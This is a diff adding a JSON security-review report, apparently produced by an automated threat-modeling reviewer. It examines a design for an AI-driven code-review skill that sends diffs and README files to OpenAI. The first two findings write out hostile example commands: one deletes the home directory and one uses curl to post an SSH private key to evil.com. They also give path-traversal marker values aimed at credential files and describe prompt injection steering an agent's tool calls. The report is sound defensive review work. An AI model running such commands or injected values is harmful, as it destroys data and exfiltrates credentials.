@@ -1,0 +1,73 @@
+{
+  "reviewer": "threat-modeler",
+  "schema_version": "1.0",
+  "iteration": 1,
+  "status": "ok",
+  "verdict": "needs_revision",
+  "findings": [
+    {
+      "severity": "critical",
+      "category": "security",
+      "file": "architecture",
+      "line": null,
+      "finding": "The settings.json permission entry `Bash(OPENAI_API_KEY=:*)` auto-approves any Bash command whose text starts with `OPENAI_API_KEY=`, not just legitimate review invocations. An attacker who can inject a tool call (via prompt injection in a review finding, a crafted git diff, or a compromised MCP server) can execute arbitrary shell commands (`OPENAI_API_KEY=x rm -rf ~`, `OPENAI_API_KEY=x curl evil.com -d @~/.ssh/id_rsa`) without triggering an approval prompt. The design adds this entry explicitly, making it a designed-in privilege-escalation surface.",
+      "suggested_fix": "Replace the wildcard permission with a narrow per-script allowlist: `Bash(ai_review_openai.sh:*)` and `Bash(ai_review_json_openai.py:*)`. The key is dynamically injected as an env prefix in the SKILL.md one-liner; that one-liner should be approved on first use via auto-mode prompt, not blanket pre-approved. If a prefix pattern is truly required, scope it to the exact script path: `Bash(OPENAI_API_KEY=* skills/feature-development/ai_review_openai.sh:*)`."
+    },
+    {
+      "severity": "critical",
+      "category": "security",
+      "file": "architecture",
+      "line": null,
+      "finding": "The plan-mode path construction `specs/$(cat specs/.tlmforge_active_feature)/README.md` treats the marker file's content as a trusted directory name without validation. A malicious commit (or any actor with write access to the working tree) that writes `../../../.ssh/id_rsa` or `../../.env` to `specs/.tlmforge_active_feature` causes the script to open and send that file's contents to api.openai.com. This is an arbitrary local file read + exfiltration-to-third-party-API path.",
+      "suggested_fix": "Validate marker content before path construction. In the Python script: `import re; feature = open('specs/.tlmforge_active_feature').read().strip(); assert re.fullmatch(r'[a-zA-Z0-9_-]+', feature), 'invalid marker'; path = f'specs/{feature}/README.md'`. In the shell extension of ai_review_json.sh: `[[ \"$feature\" =~ ^[a-zA-Z0-9_-]+$ ]] || exit 2`. This blocks path separators, `..`, spaces, and shell metacharacters."
+    },
+    {
+      "severity": "high",
+      "category": "data_loss",
+      "file": "architecture",
+      "line": null,
+      "finding": "The design sends `git diff HEAD` to api.openai.com without any content inspection. A working-tree diff can contain accidentally staged .env files, credential rotation hunks with old+new key values, PII in test fixtures, or NDA-sensitive internal design details in comments. The design's risk audit table does not name 'DATA SENT TO OPENAI' as an explicit accepted risk, meaning this trust-boundary crossing is unacknowledged.",
+      "suggested_fix": "Add 'Diff content sent to OpenAI API' as an explicit row in the risk audit table with acceptance rationale. Add a lightweight pre-flight scan of the diff text for common secret patterns (OPENAI_API_KEY=, GEMINI_API_KEY=, -----BEGIN RSA, password=) and abort with status=error rather than send if matched. Document in SKILL.md that code-mode input is sent to the external LLM."
+    },
+    {
+      "severity": "high",
+      "category": "security",
+      "file": "skills/feature-development/ai_review_json_openai.py",
+      "line": null,
+      "finding": "The design mirrors the Gemini script's `write_error` pattern, which interpolates string values directly into a shell-constructed JSON string. The Gemini script uses hardcoded literals in write_error; the OpenAI Python script will populate error messages from `openai.APIError` exception text (third-party-controlled). An API error message containing a double-quote or backslash (e.g., `Model \"gpt-5.5\" not found`) breaks the JSON string boundary, producing malformed JSON. check_convergence.py then injects a reviewer_json_missing synthetic CRITICAL, blocking the convergence loop permanently on any such error.",
+      "suggested_fix": null
+    },
+    {
+      "severity": "medium",
+      "category": "security",
+      "file": "architecture",
+      "line": null,
+      "finding": "Plan-mode sends the entire README.md file to OpenAI with no size guard or content filter. A README.md that accidentally contains a secret in a code block, or that is abnormally large (50K+ tokens), is sent verbatim. The design does not document this as an accepted risk, and there is no circuit breaker on file size.",
+      "suggested_fix": null
+    },
+    {
+      "severity": "medium",
+      "category": "security",
+      "file": "skills/feature-development/ai_review_json_openai.py",
+      "line": null,
+      "finding": "The `TLMFORGE_OPENAI_MODEL` env var is passed directly to the OpenAI SDK without validation. The SDK uses it as a JSON body field (not a URL component), so JSON serialization provides implicit sanitization. However, the design assumes SDK internals are safe for arbitrary string values. A model name containing control characters or newlines could behave unexpectedly across SDK versions.",
+      "suggested_fix": null
+    },
+    {
+      "severity": "low",
+      "category": "security",
+      "file": "skills/feature-development/ai_review_openai.sh",
+      "line": null,
+      "finding": "TOCTOU between OPENAI_API_KEY presence check in the shell wrapper and the Python script's actual API call. In a CI environment where env vars are scoped per-command, the key could be absent at call time even though the wrapper's check passed. The Python script would then produce a status=error sidecar (via AuthenticationError) rather than a clean status=skipped exit 2. Low severity because the convergence engine handles both status=error and status=skipped correctly.",
+      "suggested_fix": null
+    },
+    {
+      "severity": "low",
+      "category": "security",
+      "file": "skills/feature-development/ai_review_json_openai.py",
+      "line": null,
+      "finding": "The `--output` path is accepted from a CLI argument and used in an atomic write without validation that the path is within the working tree. Requires a compromised orchestrator (e.g., prompt injection that reshapes the next tool call's --output argument) to exploit. Chained with the `OPENAI_API_KEY=:*` wildcard (CRITICAL-1), this creates a credible arbitrary file overwrite path.",
+      "suggested_fix": null
+    }
+  ]
+}
